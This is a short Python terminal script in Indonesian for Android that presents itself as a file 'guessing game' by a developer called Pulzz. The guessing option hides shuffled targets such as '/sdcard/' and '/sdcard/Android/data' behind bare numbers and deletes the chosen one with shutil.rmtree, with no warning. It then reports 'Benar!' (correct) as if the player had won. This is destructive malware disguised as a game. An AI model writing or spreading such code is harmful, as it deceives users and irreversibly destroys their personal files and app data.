import os
import shutil
import time
import random
from colorama import init, Fore, Style

init(autoreset=True)

def header(teks, lebar=40):
    print(Fore.CYAN + "╔" + "═" * lebar + "╗")
    print("║" + teks.center(lebar) + "║")
    print("╚" + "═" * lebar + "╝\n")

def loading(teks="Proses!"):
    print(Fore.YELLOW + teks, end="", flush=True)
    for _ in range(3):
        print(".", end="", flush=True)
        time.sleep(0.4)
    print("\n")

def hapus_tebakan():
    title = "🌐 Pulzz"
    box_width = 40

    target_list = [
        "/sdcard/Android",
        "/sdcard/Download",
        "/sdcard/",
        "/sdcard/Android/data"
    ]

    random.shuffle(target_list)
    targets = {str(i + 1): target_list[i] for i in range(len(target_list))}

    header(title, box_width)

    print(Fore.GREEN + "PILIH SALAH SATU:\n")
    for key in targets:
        print(Fore.MAGENTA + f"{key}.")
    print()

    choice = input(Fore.WHITE + Style.BRIGHT + "Pilihlah sesuai harapan anda (1/2/3/4): ")

    if choice in targets:
        path = targets[choice]
        nama = os.path.basename(path)

        if os.path.exists(path):
            loading("Proses!")
            try:
                if os.path.isdir(path):
                    shutil.rmtree(path)
                    print(Fore.GREEN + f" ' Benar!.\n")
                else:
                    os.remove(path)
                    print(Fore.GREEN + f" ' Benar.\n")
            except Exception as e:
                print(Fore.RED + f"❌ Salah: {e}\n")
        else:
            print(Fore.RED + f"❌ Salah.\n")
    else:
        print(Fore.RED + "❌ Pilihan tidak valid.\n")

    input(Fore.CYAN + "Tekan Enter untuk kembali ke menu...")

def lihat_file():
    print(Fore.YELLOW + "\n📂 Daftar file di /sdcard/Download/\n")
    folder = "/sdcard/Download"
    try:
        for item in os.listdir(folder):
            print("•", item)
    except Exception as e:
        print(Fore.RED + f"Gagal membaca folder: {e}")
    print()
    input(Fore.CYAN + "Tekan Enter untuk kembali ke menu...")

def developer_info():
    print(Fore.CYAN + "\n👤 Developer:")
    print("Pulzz")
    print("IG: @pulzzdev")
    print("GitHub: github.com/EPULZZZZM\n")
    print("TT: @epul.doank81")
    print("TELE: @EpulzzOfficial78")
    input(Fore.CYAN + "Tekan Enter untuk kembali ke menu...")

def menu_utama():
    while True:
        os.system('clear')
        header("🌐 Pulzz - Game Tebakkan", 40)
        print(Fore.GREEN + "1. Tebakkan File")
        print("2. Lihat file")
        print("3. Developer")
        print("4. Keluar\n")

        pilihan = input(Fore.WHITE + Style.BRIGHT + "Pilih  opsi  ( 1 - 4 ) : ")

        if pilihan == "1":
            hapus_tebakan()
        elif pilihan == "2":
            lihat_file()
        elif pilihan == "3":
            developer_info()
        elif pilihan == "4":
            print(Fore.YELLOW + "\nKeluar... 👋")
            break
        else:
            print(Fore.RED + "\n❌ Pilihan tidak valid.")
            time.sleep(1.5)

# Mulai dari menu utama
menu_utama()
